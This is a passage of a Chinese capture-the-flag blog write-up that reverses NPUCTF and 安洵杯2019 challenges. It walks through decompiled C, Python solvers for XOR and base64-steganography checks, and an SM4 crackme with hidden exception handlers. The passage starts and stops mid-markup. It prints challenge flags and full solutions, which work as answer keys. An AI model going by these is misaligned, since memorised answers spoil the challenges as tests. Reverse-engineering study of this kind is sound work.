class="line">  v30[<span class="number">1006</span>] = <span class="number">4</span>;</span><br><span class="line">  v30[<span class="number">1007</span>] = <span class="number">5</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;WHERE IS MY KEY!?&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%32s&quot;</span>, INPUT);</span><br><span class="line">  v32 = <span class="built_in">strlen</span>(INPUT);</span><br><span class="line">  v3 = <span class="built_in">GCD</span>(v28[j], v28[j]);</span><br><span class="line">  <span class="keyword">for</span> ( j = v3 / v28[j]; j &lt;= v32; ++j )        <span class="comment">// j=1~v32</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = (v28[j] + v28[j + <span class="number">1</span>]) * (v28[j] + v28[j + <span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt;= (<span class="type">int</span>)(<span class="built_in">QPOW</span>(<span class="number">2</span>, <span class="number">2</span>) * v28[j] * v28[j + <span class="number">1</span>]) )<span class="comment">// 永真</span></span><br><span class="line">    &#123;</span><br><span class="line">      v5 = ~INPUT[(<span class="type">int</span>)<span class="built_in">SUB_XX</span>(j, <span class="number">1</span>)];</span><br><span class="line">      v6 = <span class="built_in">SUB_XX</span>(j, <span class="number">1</span>);</span><br><span class="line">      v30[j] = ~(v5 + v31[v6 % (<span class="type">int</span>)<span class="built_in">QPOW</span>(<span class="number">2</span>, <span class="number">2</span>)]);</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = <span class="built_in">GCD</span>(v28[j], v28[j + <span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt; (<span class="type">int</span>)<span class="built_in">GCD</span>(v28[j + <span class="number">1</span>], ~(~v28[j + <span class="number">1</span>] + v28[j])) )<span class="comment">// 1&gt;1 永假</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = v30[j];</span><br><span class="line">      v9 = <span class="built_in">SUB_XX</span>(j, <span class="number">1</span>);</span><br><span class="line">      v30[j] = ~(~v8 + v28[v9 % (<span class="type">int</span>)<span class="built_in">QPOW</span>(<span class="number">2</span>, <span class="number">2</span>)]) * v8;</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = v28[j + <span class="number">1</span>];</span><br><span class="line">    v11 = <span class="built_in">QPOW</span>(<span class="number">2</span>, <span class="number">1</span>) * v10;</span><br><span class="line">    v12 = v28[j];</span><br><span class="line">    v13 = <span class="built_in">QPOW</span>(<span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    v14 = <span class="built_in">GCD</span>(v12 * v13, v11);                  <span class="comment">// v14=2</span></span><br><span class="line">    v15 = <span class="built_in">QPOW</span>(<span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v14 == v15 * (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">GCD</span>(v28[j], v28[j + <span class="number">1</span>]) )<span class="comment">// v14==v15 永真</span></span><br><span class="line">    &#123;</span><br><span class="line">      v16 = <span class="built_in">SUB_XX</span>(j, <span class="number">1</span>);</span><br><span class="line">      v30[j] ^= v31[v16 % (<span class="type">int</span>)<span class="built_in">QPOW</span>(<span class="number">2</span>, <span class="number">2</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = <span class="built_in">QPOW</span>(n_3, v28[j]);                    </span><br><span class="line">    v18 = v17 &lt; v28[j] + <span class="number">1</span>;                     <span class="comment">// v18=0</span></span><br><span class="line">    v19 = <span class="built_in">QPOW</span>(<span class="number">2</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)<span class="built_in">F0X3</span>(v19 &gt;= j, v18) ) <span class="comment">// v19&gt;=j : 1  F3(1,0) 最后0</span></span><br><span class="line">    &#123;</span><br><span class="line">      v20 = ~INPUT[(<span class="type">int</span>)<span class="built_in">SUB_XX</span>(j, <span class="number">1</span>)];</span><br><span class="line">      v21 = <span class="built_in">SUB_XX</span>(j, <span class="number">1</span>);</span><br><span class="line">      v30[j] ^= ~(v20 + v31[v21 % (<span class="type">int</span>)<span class="built_in">QPOW</span>(<span class="number">2</span>, <span class="number">2</span>)]);</span><br><span class="line">    &#125;</span><br><span class="line">    v22 = <span class="built_in">QPOW</span>(<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    v23 = <span class="built_in">GCD</span>(v28[j], v28[j]);</span><br><span class="line">    v30[j] *= v22 + (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">QPOW</span>(<span class="number">2</span>, v23 / v28[j]);<span class="comment">// v30[j]*=10</span></span><br><span class="line">  &#125;</span><br><span class="line">  v24 = <span class="built_in">QPOW</span>(<span class="number">2</span>, <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">SUB_XX</span>(v24, <span class="number">1</span>) != v32 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">  v25 = <span class="built_in">GCD</span>(v28[k], v28[k]);</span><br><span class="line">  <span class="keyword">for</span> ( k = v25 / v28[k]; k &lt;= v32; ++k )       <span class="comment">// k=1~v32</span></span><br><span class="line">  &#123;</span><br><span class="line">    v26 = v30[k];</span><br><span class="line">    <span class="keyword">if</span> ( v26 == (<span class="type">int</span>)<span class="built_in">SUB_XX</span>(A0X6[k], <span class="number">1</span>) / <span class="number">10</span> )</span><br><span class="line">      ++V0X2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( V0X2 == v32 )                            <span class="comment">// len=15 16</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nPASS&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">LABEL_23:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nDENIED&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后注意一个点 长度应该为15 因为他j从1开始的 所以后面提取的enc也要从1索引开始<br>逆回去即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">780</span>,<span class="number">780</span>,<span class="number">850</span>,<span class="number">590</span>,<span class="number">800</span>,<span class="number">640</span>,<span class="number">1150</span>,<span class="number">460</span>,<span class="number">980</span>,<span class="number">960</span>,<span class="number">1170</span>,<span class="number">530</span>,<span class="number">970</span>,<span class="number">1080</span>,<span class="number">1250</span>]</span><br><span class="line">enc = [x//<span class="number">10</span> <span class="keyword">for</span> x <span class="keyword">in</span> enc]</span><br><span class="line">key = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    x = enc[j]</span><br><span class="line">    x ^= key[j%<span class="number">4</span>]</span><br><span class="line">    x = (~x)&amp;<span class="number">0xff</span></span><br><span class="line">    x -= key[j%<span class="number">4</span>]</span><br><span class="line">    x &amp;= <span class="number">0xff</span></span><br><span class="line">    x = (~x)&amp;<span class="number">0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(x),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># pass</span></span><br></pre></td></tr></table></figure><p><strong>NPUCTF{0bfu5er}</strong></p><h2 id="芜湖🛫"><a href="#芜湖🛫" class="headerlink" title="芜湖🛫"></a>芜湖🛫</h2><p>真服了…<br>没有任何输入运行会得到一首歌词…<br>程序中可以找到base64的表 也能看出对一些进行了base64decode 进而得到这一串中文<br>实在想不到是base64隐写<br>好吧 知道这点后想办法把base64decode前的base64串提取出来<br>程序关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">34</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; A1[i]; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = A2[<span class="number">42</span> * i + j];</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">7</span>; ++k )</span><br><span class="line">        v2 = F1((v3 &gt;&gt; (<span class="number">7</span> - k)) &amp; <span class="number">1</span>, (<span class="number">97</span> &gt;&gt; (<span class="number">7</span> - k)) &amp; <span class="number">1</span>) ^ (<span class="number">2</span> * v2);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::operator+=((__int64)&amp;A3 + <span class="number">32</span> * i, v2);</span><br><span class="line">    &#125;</span><br><span class="line">    F2((__int64)v7, (__int64)&amp;A3 + <span class="number">32</span> * i);</span><br><span class="line">    v0 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="type">char</span>&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, v7);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v0, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v7);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>就在这句:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">F2</span>((__int64)v7, (__int64)&amp;A3 + <span class="number">32</span> * i);</span><br></pre></td></tr></table></figure><p>下断点 可以看到A3的地址 我的大概在 5583D5E4DFH左右<br>这地址在堆上 IDA内存中翻翻 找到<br><img src="https://s2.loli.net/2024/01/04/5DfGocJ3RINlFEs.png" alt="img"></p><p>我只能说nb<br>得到 55y85YmN6YeN5aSN55qE6aOO5pmvLG&#x3D;&#x3D;<br>类似的可以手动把所有的收集完<br>最后得到:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;55y85YmN6YeN5aSN55qE6aOO5pmvLG==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5riQ5riQ5qih57OK5LqG57qm5a6aLO==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5pif56m65LiL5rWB5rWq55qE5L2gLH==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5LuN54S256eY5a+G55qE6Led56a7LA==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5rip5bqm5raI5aSx55qE556s6Ze0LH==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5peg5rOV6Kem5pG455qE5piO5aSpLF==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5rKh5pyJ5byV5Yqb55qE5LiW55WMLG==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5rKh5pyJ6ISa5Y2w55qE5YWJ5bm0LD==&quot;</span>,</span><br><span class="line"><span class="string">&quot;6L+Y5Zyo562J552A5L2g5Ye6546wLH==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5pel5pel5aSc5aSc6Ieq6L2s55qE6KGM5pifLE==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5Yiw5aSE6YGu5ruh5Yir5Lq655qE6IOM5b2xLG==&quot;</span>,</span><br><span class="line"><span class="string">&quot;6K6p6aOO5ZC55pWj5re35Lmx55qE5ZG85ZC4LG==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5b+r5b+r5riF6YaSfn==&quot;</span>,</span><br><span class="line"><span class="string">&quot;6Z2Z6Z2Z54Wn5Lqu5Y6f5p2l55qE6Ieq5bexLL==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5aSp56m65rSS5ruh5b+954S255qE5YWJ5piOLE==&quot;</span>,</span><br><span class="line"><span class="string">&quot;55y85Lit5Y+q6KaB57ua54OC55qE5aSp6ZmFLG==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5YaN6aOe6KGMIW==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5oiR5YuH5pWi5Zyw5oqs6LW35aS0LM==&quot;</span>,</span><br><span class="line"><span class="string">&quot;55yL552A6Iyr6Iyr55qE5a6H5a6ZLH==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5aSa5bCR5pyq55+l55qE5pif55CDLJ==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5pyJ5rKh5pyJ6YCa5ZCR5pyq5p2l6Lev5Y+jLD==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5Lqy54ix55qE5LyZ5Ly0LB==&quot;</span>,</span><br><span class="line"><span class="string">&quot;6K6p5oiR5Lus5LiA6LW354K554eDLG==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5YuH5rCU5ZKM5L+h5b+1LO==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5Zyo6YGl6L+c55qE5aSp6L65LG==&quot;</span>,</span><br><span class="line"><span class="string">&quot;6ZO25rKz6L6557yYLH==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5pyJ5LiA54mH56We5aWH55qE5b2p6Jm55rW3LC==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5ZKM5oiR5LiA6LW35YaS6ZmpLB==&quot;</span>,</span><br><span class="line"><span class="string">&quot;6aOe5ZCR5Y+m5LiA5Liq5LiW55WMLC==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5Zyo6YGl6L+c55qE5aSp6L65LB==&quot;</span>,</span><br><span class="line"><span class="string">&quot;6ZO25rKz6L6557yYLC==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5pyJ5LiA54mH56We5aWH55qE5b2p6Jm55rW3LB==&quot;</span>,</span><br><span class="line"><span class="string">&quot;5ZKM5oiR5LiA6LW35YaS6ZmpLH==&quot;</span>,</span><br><span class="line"><span class="string">&quot;6aOe5ZCR5Y+m5LiA5Liq5LiW55WMLN==&quot;</span>,</span><br><span class="line"><span class="string">&quot;c3VwZXIgbWFnaWMgd29ybGR+fg==&quot;</span></span><br></pre></td></tr></table></figure><p>然后直接上MISC base64隐写脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">path = <span class="string">r&#x27;base.txt&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(path)</span><br><span class="line">a = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">aaa = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    text = file.readline()  <span class="comment"># 只读取一行内容</span></span><br><span class="line">    <span class="comment"># 判断是否读取到内容</span></span><br><span class="line">    text = text.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    text = text.replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    text = text.replace(<span class="string">&#x27;,&#x27;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> text.count(<span class="string">&#x27;=&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">        aaa = aaa + \</span><br><span class="line">            <span class="built_in">str</span>(<span class="string">&#x27;&#123;:02b&#125;&#x27;</span>.<span class="built_in">format</span>((a.find(text[<span class="built_in">len</span>(text)-<span class="number">2</span>])) % <span class="number">4</span>))</span><br><span class="line">    <span class="keyword">if</span> text.count(<span class="string">&#x27;=&#x27;</span>) == <span class="number">2</span>:</span><br><span class="line">        aaa = aaa + \</span><br><span class="line">            <span class="built_in">str</span>(<span class="string">&#x27;&#123;:04b&#125;&#x27;</span>.<span class="built_in">format</span>((a.find(text[<span class="built_in">len</span>(text)-<span class="number">3</span>])) % <span class="number">16</span>))</span><br><span class="line">file.close()</span><br><span class="line">t = <span class="string">&quot;&quot;</span></span><br><span class="line">ttt = <span class="built_in">len</span>(aaa)</span><br><span class="line">ttt = ttt//<span class="number">8</span>*<span class="number">8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,ttt,<span class="number">8</span>):</span><br><span class="line">    t = t + <span class="built_in">chr</span>(<span class="built_in">int</span>( aaa[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="comment"># npuctf&#123;Fly1ng!!!&#125;</span></span><br></pre></td></tr></table></figure><p><strong>npuctf{Fly1ng!!!}</strong></p><hr><hr><p>reverse里面混misc是真难绷…<br>这题唯一作用就是练习了在堆上找数据…</p><h1 id="安洵杯2019"><a href="#安洵杯2019" class="headerlink" title="安洵杯2019"></a>安洵杯2019</h1><h2 id="crackMe"><a href="#crackMe" class="headerlink" title="crackMe"></a>crackMe</h2><p>挺好的题<br>考点: 异常处理+base64变表(看作2次变表)+SM4算法</p><p>main:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl __noreturn <span class="title">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE v3[<span class="number">6</span>]; <span class="comment">// [esp-4h] [ebp-D0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please Input the flag:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf_s</span>(<span class="string">&quot;%s&quot;</span>, &amp;INPUT);</span><br><span class="line">  <span class="built_in">MessageBoxW</span>(<span class="number">0</span>, <span class="string">L&quot;Exception&quot;</span>, <span class="string">L&quot;Warning&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  *(_DWORD *)v3 = sub_50100F;</span><br><span class="line">  MEMORY[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">j_FINAL_CHECK</span>(*(<span class="type">int</span> *)&amp;v3[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里很容易想到触发异常 进行ExceptionFilter和处理<br>但是直接找找不着</p><p>注意到运行exe会弹出 hook 弹窗 提示我们可能进行了hook操作<br>动调or瞎翻&#x2F;查看交叉引用<br>找到</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __stdcall <span class="title">CHANGE_BASE64_TABLE_AND_ADD_EXCEPTION_HANDLER</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [esp+D8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">j_strlen</span>(BASE64_table_41A080); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( BASE64_table_41A080[i] &lt;= <span class="number">122</span> &amp;&amp; BASE64_table_41A080[i] &gt;= <span class="number">97</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      BASE64_table_41A080[i] -= <span class="number">32</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( BASE64_table_41A080[i] &lt;= <span class="number">90</span> &amp;&amp; BASE64_table_41A080[i] &gt;= <span class="number">65</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      BASE64_table_41A080[i] += <span class="number">32</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="string">&quot;hooked&quot;</span>, <span class="string">&quot;successed&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">0</span>, Handler);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对base64的table进行了大小写互换 同时出现了hook字样<br>后面跟了个ExceptionHandler<br>这样我们前面的分析就能说得通了<br>查看handler</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __stdcall <span class="title">Handler_0</span><span class="params">(_DWORD **a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> SM4_KEY[<span class="number">20</span>]; <span class="comment">// [esp+D0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( **a1 == <span class="number">0xC0000005</span> )                     <span class="comment">// 异常</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">qmemcpy</span>(SM4_KEY, <span class="string">&quot;where_are_u_now?&quot;</span>, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">sub_501172</span>((<span class="type">int</span>)&amp;unk_50A218, (<span class="type">int</span>)SM4_KEY);</span><br><span class="line">    <span class="built_in">SetUnhandledExceptionFilter</span>(TopLevelExceptionFilter);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的0xC0000005就是访问非法内存的异常<br>这里跟进 sub_501172</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title">SM4233</span><span class="params">(<span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+D0h] [ebp-B8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+DCh] [ebp-ACh]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+E0h] [ebp-A8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+E4h] [ebp-A4h]</span></span><br><span class="line">  <span class="type">int</span> v7[<span class="number">35</span>]; <span class="comment">// [esp+E8h] [ebp-A0h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [esp+174h] [ebp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [esp+178h] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// [esp+17Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// [esp+180h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;                                       <span class="comment">// 还是SM4吧~</span></span><br><span class="line">  v8 = _byteswap_ulong(*a2);</span><br><span class="line">  v9 = _byteswap_ulong(a2[<span class="number">1</span>]);</span><br><span class="line">  v10 = _byteswap_ulong(a2[<span class="number">2</span>]);</span><br><span class="line">  v11 = _byteswap_ulong(a2[<span class="number">3</span>]);</span><br><span class="line">  v4 = v8 ^ <span class="number">0xA3B1BAC6</span>;</span><br><span class="line">  v5 = dword_507A68[<span class="number">1</span>] ^ v9;</span><br><span class="line">  v6 = dword_507A68[<span class="number">2</span>] ^ v10;</span><br><span class="line">  result = <span class="number">12</span>;</span><br><span class="line">  v7[<span class="number">0</span>] = dword_507A68[<span class="number">3</span>] ^ v11;</span><br><span class="line">  <span class="keyword">while</span> ( v3 &lt; <span class="number">0x20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7[v3 + <span class="number">1</span>] = *(&amp;v4 + v3) ^ <span class="built_in">sub_5014E0</span>(dword_507A78[v3] ^ v7[v3] ^ v7[v3 - <span class="number">1</span>] ^ *(&amp;v5 + v3));</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">4</span> * v3) = v7[v3 + <span class="number">1</span>];</span><br><span class="line">    result = ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很容易识别出是SM4加密算法的特征</p><p>注意到还有个 TopLevelExceptionFilter</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">sub_502C30</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [esp+D3h] [ebp-11h]</span></span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [esp+DCh] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="type">int</span>)a1;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)*a1 == <span 